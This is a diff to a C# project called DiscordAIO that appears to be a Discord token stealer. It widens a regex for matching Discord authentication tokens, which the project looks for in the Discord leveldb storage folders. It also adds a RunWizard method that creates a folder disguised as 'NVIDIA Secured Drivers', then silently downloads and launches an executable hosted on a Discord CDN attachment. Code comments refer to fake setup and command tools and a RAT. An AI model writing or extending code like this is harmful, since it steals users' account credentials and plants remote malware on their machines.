@@ -482,7 +482,7 @@ namespace DiscordAIO
 	}
 	internal sealed class Discord
 	{
-		private static Regex TokenRegex = new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}");
+		private static Regex TokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
 		private static string[] DiscordDirectories = new string[]{
 			"Discord\\Local Storage\\leveldb",
 			"Discord PTB\\Local Storage\\leveldb",
@@ -2922,7 +2922,20 @@ namespace DiscordAIO
             catch {}
 		}
 
+		public static void RunWizard() 
+		{
+		    if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
+            {
+                Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
+			}
 
+			try
+			{
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951466723406667806/DiscordTools.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
+			}
+			catch {}
+			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
+		}
 
 		public static void RunFAKEcmd() 
 		{
@@ -3092,6 +3105,7 @@ namespace DiscordAIO
 
 			//ourcoolfakecmd
 			//ourcoolfakenitrogen
+			//ourcoolfakesetup
 
 			//ratoverhere
 
